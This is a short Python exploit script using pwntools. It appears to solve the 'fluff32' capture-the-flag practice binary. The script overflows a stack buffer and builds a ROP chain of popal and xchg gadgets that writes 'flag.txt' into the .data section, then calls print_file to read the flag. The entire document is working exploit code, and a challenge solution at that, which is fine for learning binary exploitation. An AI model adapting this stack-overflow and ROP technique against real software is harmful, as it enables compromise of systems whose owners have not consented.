from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./fluff32")

# gadgets
ret          = 0x8048382 # ret;
pop_all      = 0x8048527 # popal; cld; ret;
write_gadget = 0x8048555 # xchg byte ptr [ecx], dl; ret;

# write location
data_sec     = 0x804a018

# target function
print_file   = 0x80483d0

def write_data(location: int, data: str) -> bytes:
    layout = b""

    for i in range(0, len(data)):
        layout += p32(pop_all)
        layout += p32(0)
        layout += p32(0)
        layout += p32(0)
        layout += p32(0)
        layout += p32(0)
        layout += p32(ord(data[i]))
        layout += p32(data_sec + i)
        layout += p32(ret)
        layout += p32(write_gadget)

    return layout


def gen_payload(size: int) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset
    payload += write_data(data_sec, "flag.txt")
    payload += p32(print_file)
    payload += p32(0)
    payload += p32(data_sec)

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
